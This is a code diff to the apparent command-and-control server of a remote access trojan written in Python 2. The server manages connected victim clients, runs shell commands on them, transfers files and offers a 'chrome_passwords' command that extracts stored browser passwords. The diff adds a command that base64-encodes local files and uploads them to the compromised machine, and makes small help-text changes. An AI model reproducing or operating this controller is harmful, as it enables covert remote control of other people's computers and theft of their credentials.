@@ -8,7 +8,6 @@ import os
 import struct
 import uuid
 import base64
-import time
 
 try:
     import gnureadline
@@ -121,7 +120,7 @@ class Client:
             raise ex
 
     def get_prompt(self):
-        """Returns the fancy terminal prompt for the client."""
+        """Returns the fancy terminal prompt for the client, otherwise None."""
         try:
             shell_info = self.send_command("get_shell_info").split("\t")
 
@@ -241,7 +240,7 @@ if __name__ == '__main__':
                     print "status            -  Show debug information."
                     print "clients           -  Show a list of clients."
                     print "connect <ID>      -  Connect to the client."
-                    print "exit              -  Closes the server."
+                    print "exit              -  Close the server and exit."
             elif command == "status":
                 print_status()
             elif command == "clients":
@@ -295,6 +294,30 @@ if __name__ == '__main__':
                                     print MESSAGE_INFO + "File written to {0}.".format(output_file)
                             except IndexError:
                                 print MESSAGE_ATTENTION + "Please specify the remote file."
+                        elif command.startswith("upload"):
+                            print MESSAGE_INFO + "The file will be uploaded to the current remote folder."
+
+                            if command == "upload":
+                                upload_file = os.path.expanduser(raw_input(MESSAGE_INPUT + "Enter the local file's path: "))
+                            else:
+                                upload_file = os.path.expanduser(command.replace("upload ", ""))
+
+                            if not os.path.isfile(upload_file):
+                                print MESSAGE_ATTENTION + "File doesn't exist!"
+                                continue
+
+                            file_name = raw_input(MESSAGE_INPUT + "New filename (or empty for \"{0}\"): "
+                                                  .format(os.path.basename(upload_file))) \
+                                        or os.path.basename(upload_file)
+
+                            with open(os.path.realpath(upload_file), "r") as open_file:
+                                encoded_file = base64.b64encode(open_file.read())
+
+                                if not encoded_file:
+                                    print MESSAGE_ATTENTION + "Failed to upload: Empty file."
+                                else:
+                                    print server.current_client.send_command("upload {0} {1}"
+                                                                             .format(file_name, encoded_file))
                         elif command == "chrome_passwords":
                             print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                             confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")
@@ -381,7 +404,7 @@ if __name__ == '__main__':
                             # Regular shell command.
                             response = server.current_client.send_command(command)
 
-                            if command.startswith("cd"):  # Commands that have no output.
+                            if command.startswith("cd") or command.startswith("rm"):  # Commands that have no output.
                                 pass
                             elif response == "EMPTY":
                                 print MESSAGE_ATTENTION + "No command output."
